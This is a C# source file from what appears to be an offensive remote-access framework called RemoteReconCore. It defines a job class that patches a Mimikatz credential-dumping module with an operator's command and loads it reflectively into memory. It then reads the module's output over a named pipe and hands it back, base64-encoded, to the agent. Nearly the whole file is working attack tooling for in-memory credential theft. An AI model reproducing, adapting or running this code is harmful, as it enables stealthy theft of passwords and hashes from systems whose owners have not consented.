using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Reflection;
using ReflectiveInjector;
using System.Threading;
using System.ComponentModel;

namespace RemoteReconCore
{
    public class mimikatz : IJobs
    {
        private static string mmCmd = "";
        private static byte[] mmBin;
        public mimikatz(string cmd, byte[] mod)
        {
            mmCmd = cmd;
            mmBin = mod;
        }

        public KeyValuePair<int, string> Run()
        {
            //Load the mimikatz dll reflectively into the current process. Call the function export
            // for powershell_reflective_mimikatz with our command and obtain the result.
            byte[] patchedMM = Agent.PatchRemoteReconNative(mmCmd, toReplace);
#if DEBUG
            Console.WriteLine("Patched module");
#endif
            Thread server = new Thread(() =>
            {
                GetMimikatzOutput();
            });
            server.IsBackground = true;
            server.Start();
#if DEBUG
            Console.WriteLine("Started background NamedPipeServer thread");
#endif
            Injector m = new Injector(patchedMM);
            if (!m.Load())
            {
                server.Abort();
                return new KeyValuePair<int, string>(9, Convert.ToBase64String(Encoding.ASCII.GetBytes("Mimikatz load failed")));
            }
            else
            {
                try
                {
                    Thread.Sleep(Agent.sleep * 1000);
                    string enc = Convert.ToBase64String(Encoding.ASCII.GetBytes(mimikatzOut.ToString()));
                    return new KeyValuePair<int, string>(0, enc);
                }
                catch (Exception e)
                {
#if DEBUG
                    Console.WriteLine(e.ToString());
#endif
                    string enc = Convert.ToBase64String(Encoding.ASCII.GetBytes(e.ToString()));
                    return new KeyValuePair<int, string>(9, enc);
                }
            }
            
        }

        private unsafe void GetMimikatzOutput()
        {
            //Start a named pipe server and wait for output from mimikatz
            IntPtr sa = WinApi.CreateNullDescriptorPtr();
            hPipe = WinApi.CreateNamedPipe(@"\\.\pipe\mm12",
                                           WinApi.PIPE_ACCESS_INBOUND,
                                           (WinApi.PIPE_READMODE_BYTE | WinApi.PIPE_WAIT),
                                           1,
                                           0,
                                           1025,
                                           20000,
                                           sa);

#if DEBUG
            Console.WriteLine("Waiting for client to connect");
#endif
            //Blocking call to wait for a client to connect
            WinApi.ConnectNamedPipe(hPipe, IntPtr.Zero);

            try
            {
#if DEBUG
                Console.WriteLine("Received connection from client");
                Console.WriteLine("Reading output from mimikatz");
#endif
                uint bytesLeft = 0;
                bool finishedRead = false;

                do
                {
                    Thread.Sleep(1000);
                    

                    byte[] readBuff = new byte[1024 + 1];
                    uint bytesRead = 0;
                    uint bytesAvail = 0;
                    uint read = 0;

                    //Check if there is data to read in the pipe
                    //if (!WinApi.PeekNamedPipe(hPipe, null, 0, ref bytesRead, ref bytesAvail, ref bytesLeft) && bytesAvail == 0)
                        //continue;

#if DEBUG
                    Console.WriteLine("Appears to be data in the pipe");
#endif
                    //If we can't read for some reason, continue
                    finishedRead = ReadFile(hPipe, readBuff, (uint)readBuff.Length, ref read, IntPtr.Zero);
                    if (!finishedRead && ERROR_MORE_DATA != Marshal.GetLastWin32Error())
                    {
                        string msg = new Win32Exception(Marshal.GetLastWin32Error()).Message;
#if DEBUG
                        Console.WriteLine("Error reading from pipe: " + msg);
#endif
                        mimikatzOut.Append(msg);
                        break;
                    }
                        

#if DEBUG
                    Console.WriteLine("Received data from the pipe with length: " + read);
#endif
                    string ret = Encoding.ASCII.GetString(readBuff);
                    //ret = ret.TrimEnd(new char[] { '\0' });
#if DEBUG
                    Console.WriteLine("Received output with length: " + ret.Length + "\r\n");
                    Console.Write(ret);
#endif
                    mimikatzOut.Append(ret);

                    //if (WinApi.ConnectNamedPipe(hPipe, IntPtr.Zero) == false && (uint)Marshal.GetLastWin32Error() != WinApi.ERROR_PIPE_CONNECTED)
                        //break;

                } while (!finishedRead);

                if (!WinApi.DisconnectNamedPipe(hPipe))
                    Console.WriteLine("Unable to disconnect from client");
            }
            catch (Exception e)
            {
#if DEBUG
                Console.WriteLine(e.ToString());
#endif
            }
        }

        private StringBuilder mimikatzOut = new StringBuilder();
        private IntPtr hPipe;
        private const int ERROR_MORE_DATA = 234;
        private string toReplace = "Replace-Me                                                                      ";

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadFile(IntPtr handle, byte[] buffer, uint toRead, ref uint read, IntPtr lpOverLapped);
    }
}
